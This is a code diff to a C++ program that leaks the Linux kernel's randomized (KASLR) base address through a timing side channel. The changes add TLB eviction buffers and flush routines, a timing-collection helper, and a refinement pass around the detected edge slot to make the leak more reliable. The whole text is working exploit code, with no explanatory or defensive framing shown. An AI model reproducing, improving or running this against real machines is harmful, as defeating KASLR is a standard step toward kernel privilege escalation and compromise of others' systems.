@@ -25,6 +25,7 @@
 #include <sys/syscall.h>
 #include <unistd.h>
 #include <immintrin.h>
+#include <string.h>
 
 bool is_kaslr_base(uint64_t kbase_addr) {
     if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000)
@@ -62,6 +63,7 @@ const uint64_t KASLR_END = KASLR_START + 0x40000000;
 const uint64_t KASLR_SLOT_SIZE = 0x200000;
 
 const int KASLR_MAX_ATTEMPTS = 100;
+const int KASLR_REFINEMENT_BACKTRACK = 5;
 
 uint64_t compute_median(std::vector<uint64_t> v) {
     assert(!v.empty() && "compute_median received an empty vector");
@@ -148,6 +150,83 @@ uint64_t sidechannel(uint64_t addr) {
     return delta;
 }
 
+#define _TLB_BUFFER_LENGTH (16 * 1024 * 1024)
+static char _tlb_buffer1[_TLB_BUFFER_LENGTH] = {0};
+static char _tlb_buffer2[_TLB_BUFFER_LENGTH] = {0};
+volatile char* _tlb_l1e, *_tlb_l2s;
+
+static char* _align_page_address(char *address, size_t align)
+{
+	uint64_t target = (uint64_t) address;
+	uint64_t aligned;
+
+	aligned = target + (align - (target & (align - 1)));
+
+	return (char *)aligned;
+}
+
+static void evict_l1_tlb_set(size_t set)
+{
+	size_t index, i;
+	volatile char *eviction, *p = _tlb_l1e;
+
+	for (i = 0; i < 4; ++i) {
+		index = (set + (i * 16)) << 12;
+		eviction = (char *)((size_t) p | index);
+		*eviction = 0x5A;
+	}
+}
+
+static void evict_l2_tlb_set(size_t set)
+{
+	size_t index, i;
+	volatile char *eviction, *p = _tlb_l2s;
+
+	for (i = 0; i < 4; ++i) {
+		index = (set + (i * 128)) << 12;
+		eviction = (char *)((size_t) p | index);
+		*eviction = 0x5A;
+	}
+}
+
+static void evict_l1_tlb_all(void)
+{
+	for (size_t set = 0; set < 128; set++) {
+		evict_l1_tlb_set(set);
+	}
+}
+
+void tlb_flush(void) {
+	for (size_t set = 0; set < 128; set++) {
+		evict_l1_tlb_all();
+		evict_l2_tlb_set(set);
+	}
+
+  asm volatile("lfence");
+}
+
+void tlb_init(void) {
+  memset(_tlb_buffer1, 2, _TLB_BUFFER_LENGTH);
+  memset(_tlb_buffer2, 2, _TLB_BUFFER_LENGTH);
+
+	_tlb_l1e = _align_page_address((char*) &_tlb_buffer1, 0x40000);
+	_tlb_l2s = _align_page_address((char*) &_tlb_buffer2, 0x40000);
+}
+
+void collect_timings(size_t start_slot, size_t end_slot, int samples, bool flush_tlb,
+                     std::vector<std::vector<uint64_t>>& all_timings) {
+    for (int i = 0; i < samples; i++) {
+        for (size_t slot = start_slot; slot < end_slot; slot++) {
+            uint64_t addr = slot_to_addr(slot);
+            if (flush_tlb) {
+                tlb_flush();
+            }
+            uint64_t timing = sidechannel(addr);
+            all_timings[slot].push_back(timing);
+        }
+    }
+}
+
 std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
     std::vector<std::vector<uint64_t>> all_timings(slots);
@@ -155,22 +234,42 @@ std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(in
         t.reserve(samples);
     }
 
-    for (int i = 0; i < samples; i++) {
-        for (size_t slot = 0; slot < slots; slot++) {
-            uint64_t addr = slot_to_addr(slot);
-            uint64_t timing = sidechannel(addr);
-            all_timings[slot].push_back(timing);
-        }
-    }
+    // Step 1: Coarse scan without TLB flush
+    collect_timings(0, slots, samples, false, all_timings);
 
     std::vector<uint64_t> timings(slots);
     for (size_t slot = 0; slot < slots; slot++) {
         timings[slot] = compute_median(all_timings[slot]);
     }
 
-    std::optional<size_t> slot = try_find_edge(timings);
-    if (slot.has_value()) {
-        return {slot_to_addr(*slot), timings};
+    std::optional<size_t> candidate_slot = try_find_edge(timings);
+    
+    // Step 2: Refinement with TLB flush
+    if (candidate_slot.has_value()) {
+        size_t refine_end = *candidate_slot + 1; // Inclusive of candidate
+        size_t refine_start = 0;
+        if (*candidate_slot > KASLR_REFINEMENT_BACKTRACK) {
+            refine_start = *candidate_slot - KASLR_REFINEMENT_BACKTRACK;
+        }
+
+        // Clear previous timings for the refined range to avoid mixing data
+        for (size_t slot = refine_start; slot < refine_end; slot++) {
+            all_timings[slot].clear();
+        }
+
+        collect_timings(refine_start, refine_end, 1000, true, all_timings);
+
+        // Recompute medians for refined slots
+        for (size_t slot = refine_start; slot < refine_end; slot++) {
+            timings[slot] = compute_median(all_timings[slot]);
+        }
+        
+        // Final edge detection with mixed (refined + coarse) data
+        candidate_slot = try_find_edge(timings);
+    }
+
+    if (candidate_slot.has_value()) {
+        return {slot_to_addr(*candidate_slot), timings};
     }
     return {std::nullopt, timings};
 }
@@ -208,6 +307,7 @@ std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>
 }
 
 uint64_t leak_kaslr_base(int samples, int trials, std::vector<std::vector<uint64_t>>* debug_data) {
+    tlb_init();
     std::vector<std::optional<uint64_t>> slots(trials);
     for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
         for (int trial = 0; trial < trials; trial++) {
